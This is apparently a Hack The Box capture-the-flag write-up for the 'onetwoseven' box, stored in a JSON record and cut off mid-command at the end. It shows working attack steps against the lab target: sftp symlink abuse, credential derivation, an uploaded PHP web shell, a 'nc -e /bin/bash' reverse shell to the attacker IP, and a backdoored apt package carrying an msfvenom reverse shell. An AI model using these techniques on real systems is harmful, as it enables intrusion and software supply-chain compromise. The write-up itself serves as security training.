{
    "criteria": [
        {
            "criterion": "AllDocuments",
            "passed": true,
            "reason": "All documents pass."
        },
        {
            "criterion": "QuestionAnswerStringsV2",
            "passed": false,
            "reason": "Does not meet criterion."
        },
        {
            "criterion": "FullyStructured",
            "passed": false,
            "reason": "Does not meet criterion."
        },
        {
            "criterion": "ExamStringsV2",
            "passed": false,
            "reason": "Does not meet criterion."
        },
        {
            "criterion": "ExamplesStrings",
            "passed": false,
            "reason": "Does not meet criterion."
        },
        {
            "criterion": "ExamplesStringsV2",
            "passed": false,
            "reason": "Does not meet criterion."
        },
        {
            "criterion": "ListPrefixV2",
            "passed": true,
            "reason": "Text contains ['1', '1', '2', '7', '1', '1', '6', '1', '-']."
        },
        {
            "criterion": "ExamplesMinimalEmbed",
            "passed": false,
            "reason": "Does not meet criterion."
        },
        {
            "criterion": "ExamplesSynonymsEmbed",
            "passed": false,
            "reason": "Does not meet criterion."
        },
        {
            "criterion": "ExamplesDiverseEmbed",
            "passed": true,
            "reason": "Text contains ['Some files of interest that we can examine are signup.php and index.php . (0.193)', 'There are a lot of traffic bending techniques to be learned on that one. (0.198)', 'From our discussion about RewriteRules, we know that there are two methods of requesting this file. (0.187)']."
        }
    ],
    "doc_id": "291",
    "text": "Aug 31, 2019 | 24 minutes read\n\nTags: hack-the-box, ssh tunneling, tunnels, sftp, php, apt, apt-get, man-in-the-middle, mitm, unrestricted-file-upload, sudo, linux, source-code-analysis\n\nMy hat goes off to onetwoseven\u2019s creator jkr; this box was top-notch. The flow of the box was seamless. Enumeration felt like a natural progression and the breadcrumbs were plentiful and placed in logical locations (often in more than one spot to facilitate multiple avenues of approach). I was really impressed with his first box submission. His second box Writeup is still active and not as difficult, but still high quality. At the time of this writing, onetwoseven is about to be replaced by another jkr box: zetta. I\u2019m definitely looking forward to it!\n\nScans\n\nmasscan\n\nAs usual, we start with a masscan followed by a targeted nmap .\n\nmasscan -e tun0 --ports U:0-65535,0-65535 --rate 700 -oL masscan.10.10.10.133.all 10.10.10.133 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 open tcp 22 10.10.10.133 1562031220 open tcp 80 10.10.10.133 1562031259\n\nnmap\n\nnmap -p 22,80 -sC -sV -oA nmap.10.10.10.133 10.10.10.133 \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 48:6c:93:34:16:58:05:eb:9a:e5:5b:96:b6:d5:14:aa (RSA) | 256 32:b7:f3:e2:6d:ac:94:3e:6f:11:d8:05:b9:69:58:45 (ECDSA) |_ 256 35:52:04:dc:32:69:1a:b7:52:76:06:e3:6c:17:1e:ad (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Page moved. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nInitial Access\n\nNormally, this is where we would perform forced browsing or some form of automated web scan. However, there is rate-limiting, so we need to manually browse the site. There\u2019s a portion of the site that tells us as much, though most folks found out the hard way.\n\nWhile browsing, we come across http://10.10.10.133/signup.php and see that it provides us credentials for sftp .\n\nWe also see the use of a domain name onetwoseven.htb . Before moving on, let\u2019s update our local DNS entry for the box in /etc/hosts .\n\n/etc/hosts \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -------------8<------------- 10.10.10.133 onetwoseven.htb -------------8<-------------\n\nWith that done, let\u2019s check out what we have access to on the remote filesystem.\n\nWe\u2019ll start by accessing the sftp server as our pre-generated user. Because uploading and executing a web shell does not work, let\u2019s check out what commands are available to us with the help command.\n\nsftp ots-yZjFkZWY@onetwoseven.htb ots-yZjFkZWY@onetwoseven.htb's password: 122f1def Connected to ots-yZjFkZWY@onetwoseven.htb. sftp> help -------------8<------------- lmkdir path Create local directory ln [-s] oldpath newpath Link remote file (-s for symlink) lpwd Print local working directory ls [-1afhlnrSt] [path] Display remote directory listing -------------8<-------------ln - symlink oldpath newpath Symlink remote file -------------8<-------------\n\nCreating a symlink sounds like it has potential and the public_html folder is writable; let\u2019s see where it takes us.\n\nSource Code Recovery\n\nLet\u2019s begin with some source code recovery. We\u2019ll utilize the symlink command to allow us to browse the raw php files. Some files of interest that we can examine are signup.php and index.php . If we try to symlink to these files using the same name (i.e. with the php extension), we\u2019ll run into problems with the server trying to execute the php. Instead, we\u2019ll drop the php extension so we can recover the source code.\n\nsftp> ln -s /var/www/html/index.php index sftp> ln -s /var/www/html/signup.php signup\n\nLet\u2019s take a look at index first. We can\u2019t view/get the files from within the sftp shell. The trick here is that we need to enter view-source:http://10.10.10.133/~ots-yZjFkZWY/index in our browser. When we do, we\u2019re presented with the php source code. In it, we can see a breadcrumb. It lets us know that if we are accessing this page from the server itself (127.0.0.1) or 104.24.0.54, a link to the admin panel will be visible. The admin panel itself appears to be listening on port 60080 . We\u2019ll keep this in mind as we progress.\n\nThe next file, signup , contains a juicy piece of information. Specifically, it shows us how usernames and passwords are generated for the sftp logins.\n\nLet\u2019s confirm what the username function does with our ip address.\n\n1 php > $hash = md5('10.10.14.3'); 2 php > print $hash; 3 122f1def6a8b5601963ee3163b041696 4 5 php > $first_username = substr($hash, 0, 8); 6 php > print $first_username; 7 122f1def 8 9 php > print base64_encode($first_username); 10 MTIyZjFkZWY= 11 php > $encoded_username = base64_encode($first_username); 12 13 php > print str_replace('=', '', $encoded_username); 14 MTIyZjFkZWY 15 php > $replaced_username = str_replace('=', '', $encoded_username); 16 17 php > print substr($replaced_username, 3); 18 yZjFkZWY 19 20 php > $final = substr($replaced_username, 3); 21 php > print \"ots-\" . $final; 22 ots-yZjFkZWY\n\nline 1: generates the md5sum of the given ip address\n\nline 5: grabs the first 8 characters of the hashed ip\n\nline 9: base64 encodes the shortened hash\n\nline 13: removes any equal signs from the string\n\nline 17: returns a substring of the shortened/replaced hash starting with the fourth character and going out to the end of the string\n\nline 21: concatenates the string \u201cots-\u201d with the result of all the above actions, giving us our username\n\nThe password is much less complex.\n\nphp > $hash = md5('10.10.14.3'); php > print substr($hash, 0, 8); 122f1def\n\nOk, so why do we care? If any other users follow the ots- pattern, we can get their password! Let\u2019s check out /etc/passwd and see if there are any users of interest.\n\nuser.txt\n\nBack in our sftp shell, we can symlink /etc/passwd and check out the contents.\n\nsftp> ln -s /etc/passwd passwd\n\nots-yODc2NGQ:x:999:999:127.0.0.1:/home/web/ots-yODc2NGQ:/bin/false ots-yZjFkZWY:x:1001:1001:10.10.14.3:/home/web/ots-yZjFkZWY:/bin/false\n\nIn the output above, we can see our username. The nice thing here is that the ip address is noted in the GECOS field of each /etc/passwd entry. Let\u2019s take the next logical step and grab the password for the user associated with 127.0.0.1!\n\nphp > print substr(md5('127.0.0.1'), 0, 8); f528764d\n\nThere we have it, a set of credentials! Let\u2019s use them on the sftp service.\n\nsftp ots-yODc2NGQ@onetwoseven.htb ots-yODc2NGQ@onetwoseven.htb's password: f528764d Connected to ots-yODc2NGQ@onetwoseven.htb. sftp> ls -al drwxr-xr-x 3 0 0 4096 Feb 15 2019 . drwxr-xr-x 3 0 0 4096 Feb 15 2019 .. drwxr-xr-x 2 999 999 4096 Feb 15 2019 public_html -r--r----- 1 0 999 33 Feb 15 2019 user.txt\n\nAfter logging in, we see user.txt waiting for us. All that\u2019s left is to download it and turn it in!\n\nsftp> get user.txt Fetching /user.txt to user.txt /user.txt 100% 33 0.3KB/s 00:00\n\ncat user.txt \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 93a4...\n\nHol\u2019up. We don\u2019t even have a shell? Let\u2019s fix that as we go for root.\n\nUnauth to www-admin-data\n\n.login.php.swp\n\nLet\u2019s revisit the sftp server yet again. This time, we\u2019ll link the root of the filesystem (or at least our view of it).\n\nsftp> cd public_html/ sftp> ln -s / root\n\nWe\u2019ll make use of our browser again to view the results.\n\nDrilling down into the folders, the only file of interest we have permission to browse to at this point is .login.php.swp , located at http://onetwoseven.htb/~ots-mODVhZTM/var/www/html-admin/ .\n\nLet\u2019s download the file and analyze its contents. Running the file command on .login.php.swp shows us that it\u2019s a vim swap file. (firefox may have named the file login.php.swp on your behalf, don\u2019t sweat it. The following steps work either way)\n\nfile .login.php.swp \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 login.php.swp: Vim swap file, version 8.0, pid 1861, user root, host onetwoseven, file /var/www/html-admin/login.php\n\nIn this case, when vim opened the login.php file for editing, it created a hidden swap file .login.php.swp . This is pretty standard vim behavior and it\u2019s quite common to see these laying around as a result of vim exiting in a weird state or vim editors being left open. Luckily for us, having the swap file makes it incredibly easy to recover the original file.\n\nvim -r .login.php.swp \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 Using swap file \".login.php.swp\" \"/var/www/html-admin/login.php\" [New DIRECTORY] Recovery completed. You should check if everything is OK. (You might want to write out this file under another name and run diff with the original file to check for changes) You may want to delete the .swp file now. Press ENTER or type command to continue\n\nOnce we\u2019re presented with the prompt above, we can press ENTER and revel in the glory of our freshly recovered file. There are a few lines that we\u2019re definitely concerned with; we\u2019ll start with line #1.\n\n1 <?php if ( $_SERVER[ 'SERVER_PORT' ] != 60080 ) { die (); } ?> 2\n\nLine #1 tells us that we can expect the server running this php file to be on port 60080. Recall from our source code recovery that we\u2019ve seen this port listed before. With all we\u2019ve seen so far, it\u2019s safe to assume that it will be running on localhost.\n\nNext up, line #26 lets us know that this php file is tied to their backend administration.\n\n26 < a class = \"navbar-brand\" href = \"/login.php\" >OneTwoSeven - Administration Backend</ a >\n\nThe really juicy stuff is on line #78; an admin username and password hash!\n\n78 if ($_POST['username'] == 'ots-admin' && hash('sha256',$_POST['password']) == '11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8') {\n\nOften, we want to reach for the cool tools like hashcat. However, we can instead just use crackstation.net to get the cleartext password.\n\nssh Tunnel to Admin Panel\n\nWe\u2019ve got creds to the admin panel, but we can\u2019t get to the site (yet). Let\u2019s try setting up an ssh tunnel to the admin panel.\n\nssh ots-yZjFkZWY@onetwoseven.htb ots-yZjFkZWY@onetwoseven.htb's password: 122f1def This service allows sftp connections only. Connection to onetwoseven.htb closed.\n\nOk, we can\u2019t ssh, or can we? Let\u2019s add a -v to the ssh command and take a closer look.\n\nssh -v ots-yZjFkZWY@onetwoseven.htb OpenSSH_8.0p1 Debian-4, OpenSSL 1.1.1c 28 May 2019 debug1: Reading configuration data /etc/ssh/ssh_config debug1: /etc/ssh/ssh_config line 19: Applying options for * -------------8<------------- debug1: Next authentication method: password ots-yZjFkZWY@onetwoseven.htb's password: 122f1def debug1: Authentication succeeded (password). Authenticated to onetwoseven.htb ([10.10.10.133]:22). debug1: channel 0: new [client-session] debug1: Requesting no-more-sessions@openssh.com debug1: Entering interactive session.\n\nThe conclusion we can draw from the above output is that the connection succeeds and the ssh connection gets established before it is disconnected by the server. We\u2019ll use this fact to set up an ssh forward tunnel to hit port 60080 on the server\u2019s loopback address.\n\nIf you\u2019re new to ssh tunneling, check out my writeup of Vault and follow along. There are a lot of traffic bending techniques to be learned on that one.\n\nTwo ssh options will assist us in setting up a tunnel without an interactive shell. Let\u2019s check them out.\n\nssh -Nf ots-yZjFkZWY@onetwoseven.htb -L 60080:127.0.0.1:60080 ots-yZjFkZWY@onetwoseven.htb's password: 122f1def\n\nssh options used: -N Do not execute a remote command. This is useful for just forwarding ports. -f Requests ssh to go to background just before command execution. -L Specifies that connections to the given TCP port on the local (client) host are to be forwarded to the given host and port on the remote side.\n\nBelow we see a breakdown of the tunneling options used.\n\nforward tunnel options used: 60080 The port on the local end to listen on; (kali:60080) 127.0.0.1 Where the traffic is destined after reaching 60080 from the point of view of the creator of the tunnel (traffic will start on kali and be sent through 10.10.10.133 to finally hit 127.0.0.1 from 10.10.10.133's point of view) 60080 The port to which traffic is destined.\n\nAfter running the command above, we\u2019ll take a look at netstat on kali. When we do, we should see a listener on port 60080.\n\nnetstat -ntlp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:60080 0.0.0.0:* LISTEN 12068/ssh tcp 0 0 0.0.0.0:111 0.0.0.0:* LISTEN 1/init tcp6 0 0 ::1:60080 :::* LISTEN 12068/ssh tcp6 0 0 :::111 :::* LISTEN 1/init tcp6 0 0 127.0.0.1:8080 :::* LISTEN 27777/java\n\nWe can see that there is a listener on 60080 on our kali machine. Any traffic sent there will be forwarded to 10.10.10.133\u2019s localhost interface on port 60080. Knowing that, we can browse to the local tunnel which will move all of our traffic through the tunnel over to the target.\n\nLet\u2019s check it out!\n\nAdmin Panel Web Shell\n\nWith our tunnel in place, we can browse to http://127.0.0.1:60080 and see the login screen. We\u2019ll proceed with our creds ots-admin:Homesweethome1\n\nAfter logging in, we\u2019re greeted by the addons menu.\n\nThe most obvious thing to try is the big Plugin Upload section at the bottom. We can use the developer tools to enable the Submit Query button.\n\nWhen we view the button in the dev tools, we see a disabled attribute on the \\<input\\> tag.\n\nWe can simply remove the attribute to enable the button.\n\nLet\u2019s try to upload a simple php web shell a try for funsies. While we\u2019re at it, let\u2019s capture the POST request in Burp, as it will come in handy later.\n\nshell.php \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 <?php system ($_GET[ 'epi' ]); ?>\n\nThe website responds with a 404 error.\n\nIf we browse to 127.0.0.1:60080/menu.php?addon=addons/ots-man-addon.php , we can see a note that tells us disabled features result in 404 errors. We can assume that there has been an attempt to disable file upload functionality.\n\nThere is also a note on the page above:\n\nThe addon manager must not be executed directly but only via the provided RewriteRules\n\nSo, when we want to download one of the files listed on the menu, we request it via a URL similar to this: http://127.0.0.1:60080/addon-download.php?addon=[SOME_PLUGIN] . Whenever addon-download.php is requested, the webserver internally rewrites the request to be addons/ots-man-addon.php . Notice that both addon-upload.php and addon-download.php are both handled by the same file: ots-man-addon.php .\n\nSince we\u2019re most interested in the file responsible for handling file upload and download, let\u2019s use one of the handy links to the side of each addon ( [DL] ) and grab ots-man-addon.php to analyze its source.\n\nBelow is the snippet of code we\u2019re concerned with. Everything below what\u2019s shown here is unrelated to getting our shell on target.\n\n1 <?php session_start (); if ( ! isset ($_SESSION[ 'username' ])) { header ( \"Location: /login.php\" ); }; if ( strpos ($_SERVER[ 'REQUEST_URI' ], '/addons/' ) !== false ) { die (); }; 2 # OneTwoSeven Admin Plugin 3 # OTS Addon Manager 4 switch ( true ) { 5 # Upload addon to addons folder. 6 case preg_match ( '/\\/addon-upload.php/' ,$_SERVER[ 'REQUEST_URI' ]) : 7 if ( isset ($_FILES[ 'addon' ])){ 8 $errors = array (); 9 $file_name = basename ($_FILES[ 'addon' ][ 'name' ]); 10 $file_size = $_FILES[ 'addon' ][ 'size' ]; 11 $file_tmp = $_FILES[ 'addon' ][ 'tmp_name' ]; 12 13 if ($file_size > 20000 ){ 14 $errors[] = 'Module too big for addon manager. Please upload manually.' ; 15 } 16 17 if ( empty ($errors) == true ) { 18 move_uploaded_file ($file_tmp,$file_name); 19 header ( \"Location: /menu.php\" ); 20 header ( \"Content-Type: text/plain\" ); 21 echo \"File uploaded successfull.y\" ; 22 } else { 23 header ( \"Location: /menu.php\" ); 24 header ( \"Content-Type: text/plain\" ); 25 echo \"Error uploading the file: \" ; 26 print_r ($errors); 27 } 28 } 29 break ; 30\n\nThe first piece of code that concerns us is line 1. Below, we have line 1 in an easier to read format.\n\n1 <?php 2 session_start (); 3 4 if ( ! isset ($_SESSION[ 'username' ])) 5 { 6 header ( \"Location: /login.php\" ); 7 }; 8 if ( strpos ($_SERVER[ 'REQUEST_URI' ], '/addons/' ) !== false ) 9 { 10 die (); 11 }; 12\n\nline 8: if the string /addons/ is found anywhere in our URL, the server will sever our connection and our request will never proceed through the rest of the code\n\nThis means we can\u2019t use the php file directly, but we can use the RewriteRules discussed above to get our requests to this file.\n\nNext, we\u2019ll take a look at hitting the case statement that controls entry into the code branch where file uploads occur.\n\n6 case preg_match('/\\/addon-upload.php/',$_SERVER['REQUEST_URI']):\n\nThe preg_match works on regular expression, so it\u2019s slightly different than the strpos discussed above. We want the code on line 6 to evaluate to true to follow that branch of code. That means that we need to include the string /addon-upload.php somewhere in our URL. There\u2019s a nice resource I use when playing with regex https://regex101.com. In the screenshot below, we\u2019ve checked the radio button on the left to designate php-style regex. The regex itself doesn\u2019t include the first and last / s. Those forward slashes denote the beginning and end of the regular expression, nothing more.\n\nRecall our request that we captured in Burp earlier. We sent a request to http://127.0.0.1:60080/addon-upload.php and got a 404 response. We need a way to include the required string, but not get the 404.\n\nFrom our discussion about RewriteRules, we know that there are two methods of requesting this file. We\u2019re going to have to request http://127.0.0.1:60080/addon-download.php to even get a request through to the file. Then, we just need to include the required string in the request.\n\nLet\u2019s go back to our captured request in Burp and alter the URL to match what we\u2019ve found.\n\nThe only change we made is highlighted on the left. We changed the URL and resent the file upload request we captured earlier. This time, we clearly see the successful response message.\n\nAll that\u2019s left to do is check that our shell.php works as intended.\n\nFor the sake of moving forward, let\u2019s grab an interactive shell. First, spin up a listener.\n\nnc -nvlp 12345\n\nAnd then, trigger the callback.\n\nhttp://127.0.0.1:60080/addons/shell.php?epi=nc -e /bin/bash 10.10.14.3 12345\n\nFinally, let\u2019s grab a TTY.\n\npython -c 'import pty;pty.spawn(\"/bin/bash\")' www-admin-data@onetwoseven:/var/www/html-admin/addons$\n\n\\o/ - access level: www-admin-data\n\nwww-admin-data to root\n\nA simple sudo -l will show us the way forward.\n\nMatching Defaults entries for www-admin-data on onetwoseven: env_reset, env_keep+=\"ftp_proxy http_proxy https_proxy no_proxy\", mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User www-admin-data may run the following commands on onetwoseven: (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade\n\nWe see some interesting environment variables are preserved when using sudo. The first thing that comes to mind is being able to proxy connections in a way that will facilitate exploitation.\n\nOne piece of information we need to examine to confirm our suspicions is what repositories the box is configured to use. We can do that by looking in /etc/apt/sources.list.d for any .list files. These files contain repository URLs and some additional metadata for the package manager to use.\n\ncat /etc/apt/sources.list.d/onetwoseven.list \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 # OneTwoSeven special packages - not yet in use deb http://packages.onetwoseven.htb/devuan ascii main\n\nNice! An unused repository. We\u2019ll need to keep this URL in mind for later.\n\nA package manager (like apt-get et. al) requests software/libraries/updates etc from remote repositories. Based on the fact that we can call both apt-get update and apt-get upgrade without a password, we can control proxy related environment variables, and that there is an unused repository configured; we can be reasonably confident that we\u2019re able to perform a man-in-the-middle attack against the package manager. We\u2019ll use the MitM attack to install backdoored software on the machine. Let\u2019s see what that looks like.\n\nBuilding a Backdoored Package\n\nA word about packages from Debian\u2019s wiki\n\nA Debian package is a collection of files that allow for applications or libraries to be distributed via the Debian package management system. The aim of packaging is to allow the automation of installing, upgrading, configuring, and removing computer programs for Debian in a consistent manner.\n\nLet\u2019s start by selecting a legitimate package installed on the system. We do this because the commands we can run are update and upgrade . This means we can\u2019t install new software. When we run update , the package manager will see there\u2019s a new package. When we run upgrade , the package manager will then download and install that updated (backdoored) package. We\u2019ll use dpkg to get a list of installed software.\n\ndpkg -l \u2550\u2550\u2550\u2550\u2550\u2550\u2550 ||/ Name Version Architecture Description +++-======================================-==================================-============-=============================================================================== ii adduser 3.115 all add and remove users and groups ii apache2 2.4.25-3+deb9u6 amd64 Apache HTTP Server ii apache2-bin 2.4.25-3+deb9u6 amd64 Apache HTTP Server (modules and other binary files) -------------8<------------- ii whiptail 0.52.19-1+b1 amd64 Displays user-friendly dialog box ii whois 5.2.17~deb9u amd64 intelligent WHOIS client ii xauth 1:1.0.9-1+b2 amd64 X authentication utility -------------8<-------------\n\nThere is no rhyme or reason here, so let\u2019s use the whois package. To find the proper version of the package we need, we\u2019ll ask the package manager what\u2019s currently installed.\n\nPackage Download\n\napt-cache show whois \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 Package: whois Version: 5.2.17~deb9u1 Installed-Size: 343 Maintainer: Marco d'Itri <md@linux.it> Architecture: amd64 Depends: libc6 (>= 2.15), libidn11 (>= 1.13) Description: intelligent WHOIS client Description-md5: 28e9df99a50bdfe098edfcf773417990 Tag: implemented-in::c, interface::commandline, network::client, protocol::ip, protocol::ipv6, role::program, suite::gnu, use::checking, use::searching Section: net Priority: optional Filename: pool/DEBIAN/main/w/whois/whois_5.2.17~deb9u1_amd64.deb Size: 76772 MD5sum: ac528a3b41bcdc8e78084d61e4aa2957 SHA256: 296aa4d2bb6ee15c7db129a4a3a0c8abbf1acb75770b4ee9241a47ee2ca37551\n\nA quick google search for 5.2.17~deb9u1 brings us to packages.debian.org/stretch/whois . Clicking through to the AMD64 download gets us the legitimate .deb file that we\u2019ll be modifying. Below the wget command is included for your convenience.\n\nwget http://http.us.debian.org/debian/pool/main/w/whois/whois_5.2.17~deb9u1_amd64.deb\n\nPackage Modification\n\nNow that we\u2019ve got our package, we can make our malicious modifications. We\u2019ll begin by extracting the package.\n\ndpkg-deb -R whois_5.2.17~deb9u1_amd64.deb backdoored-whois\n\nThe command above should give us the following directory structure.\n\nbackdoored-whois/ \u251c\u2500\u2500 DEBIAN \u2502 \u251c\u2500\u2500 control \u2502 \u2514\u2500\u2500 md5sums \u2514\u2500\u2500 usr \u251c\u2500\u2500 bin \u2502 \u251c\u2500\u2500 mkpasswd \u2502 \u2514\u2500\u2500 whois \u2514\u2500\u2500 share \u251c\u2500\u2500 doc \u2502 \u2514\u2500\u2500 whois -------------8<------------- \u251c\u2500\u2500 locale \u2502 \u251c\u2500\u2500 cs \u2502 \u2502 \u2514\u2500\u2500 LC_MESSAGES \u2502 \u2502 \u2514\u2500\u2500 whois.mo -------------8<------------- \u2514\u2500\u2500 man \u251c\u2500\u2500 man1 \u2502 \u251c\u2500\u2500 mkpasswd.1.gz \u2502 \u2514\u2500\u2500 whois.1.gz \u2514\u2500\u2500 man5 \u2514\u2500\u2500 whois.conf.5.gz\n\nOur next step is to create our callback binary; we\u2019ll do this using msfvenom .\n\nmsfvenom -p linux/x64/shell_reverse_ipv6_tcp LHOST=dead:beef:2::1001 LPORT=12345 -f elf -o backdoored-whois/usr/bin/revshell \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder or badchars specified, outputting raw payload Payload size: 90 bytes Final size of elf file: 210 bytes Saved as: backdoored-whois/usr/bin/revshell\n\nYou may be wondering, why ipv6? The answer is simple; I wrote the linux 64-bit bind/reverse shell payloads and enjoy putting them to use.\n\nDon\u2019t forget to make ./usr/bin/revshell executable!\n\nchmod +x ./usr/bin/revshell\n\nNext, we\u2019ll create our postinst maintainer script. The postinst script will run after all the contents of the package are unpacked. We likely could use some of the other maintainer scripts, but we\u2019re going to use a script to call our binary, so we want the binary to be unpacked to disk before it\u2019s executed.\n\nThere is more information in the debian packaging documentation found here and here if you\u2019re interested.\n\nbackdoored-whois/DEBIAN/postinst \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 #!/bin/sh /usr/bin/revshell &\n\nDon\u2019t forget to make postinst executable!\n\nchmod 755 backdoored-whois/DEBIAN/postinst\n\nWith that done, we can repackage our malicious whois update.\n\ndpkg-deb -b backdoored-whois \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 dpkg-deb: building package 'whois' in 'backdoored-whois.deb'.\n\nThat\u2019s it for the package, now we need to build the repository structure. We\u2019ll do that next.\n\nBuilding the Repository\n\nRecall that the target\u2019s package manager is going to reach out to us as though we are the package repository. The package manager is going to expect a certain directory structure as well as a few files to be present. We\u2019ll go ahead and create those now.\n\nFirst, let\u2019s create a working directory for the repository and move our backdoored-whois.deb into it.\n\nmkdir barebones-repo mv backdoored-whois.deb barebones-repo/ cd barebones-repo\n\nRelease file\n\nNext, we\u2019ll create a Release file inside barebones-repo . According to the Debian wiki, \u201cA Release file shall contain meta-information about the distribution and checksums.\u201d To create a Release file, we\u2019ll just copy and paste the output from apt-cache show whois from the target system (remember, we already ran this once above).\n\napt-cache show whois \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 Package: whois Version: 5.2.17~deb9u1 Installed-Size: 343 Maintainer: Marco d'Itri <md@linux.it> Architecture: amd64 Depends: libc6 (>= 2.15), libidn11 (>= 1.13) Description: intelligent WHOIS client Description-md5: 28e9df99a50bdfe098edfcf773417990 Tag: implemented-in::c, interface::commandline, network::client, protocol::ip, protocol::ipv6, role::program, suite::gnu, use::checking, use::searching Section: net Priority: optional Filename: pool/DEBIAN/main/w/whois/whois_5.2.17~deb9u1_amd64.deb Size: 76772 MD5sum: ac528a3b41bcdc8e78084d61e4aa2957 SHA256: 296aa4d2bb6ee15c7db129a4a3a0c8abbf1acb75770b4ee9241a47ee2ca37551\n\nNow we need to alter a few of the fields in the Release file. Specifically, we need to update the Version, Filename, Size, MD5sum, and SHA256 fields.\n\nThe first two changes are simple. We just increment the version number and the filename. We do this so that the package manager recognizes the need to update this particular package (i.e. the one installed on the target system is older than the one in the repo).\n\nOLD LINE: Version: 5.2.17~deb9u1 NEW LINE: Version: 5.2.17~deb9u2\n\nOLD LINE: Filename: pool/DEBIAN/main/w/whois/whois_5.2.17~deb9u1_amd64.deb NEW LINE: Filename: pool/DEBIAN/main/w/whois/whois_5.2.17~deb9u2_amd64.deb\n\nAfter that, we\u2019ll update the Size field. We just need the new size of our malicious .deb.\n\nls -l backdoored-whois.deb -rw-r--r-- 1 root root 77276 Aug 30 06:36 backdoored-whois.deb\n\nOLD LINE: Size: 76772 NEW LINE: Size: 77276\n\nNext, we update the MD5sum field. To update it, we\u2019ll need to grab the md5 hash of our .deb.\n\nmd5sum backdoored-whois.deb 2845688fc677c713b2ef8b187d0aeb71 backdoored-whois.deb\n\nOLD LINE: MD5sum: ac528a3b41bcdc8e78084d61e4aa2957 NEW LINE: MD5sum: 2845688fc677c713b2ef8b187d0aeb71\n\nFinally, the SHA256 field.\n\nsha256sum backdoored-whois.deb 725c55a28c783e6f6846694153fd2dfbf78df11fdccaf839288562aa55a67217 backdoored-whois.deb\n\nOLD LINE: SHA256: 296aa4d2bb6ee15c7db129a4a3a0c8abbf1acb75770b4ee9241a47ee2ca37551 NEW LINE: SHA256: 725c55a28c783e6f6846694153fd2dfbf78df11fdccaf839288562aa55a67217\n\nGreat, now our Release file is complete! Next up, we need a Packages file.\n\nPackages files\n\nFortunately, the content is the same as Release , so a simple copy is sufficient.\n\ncp 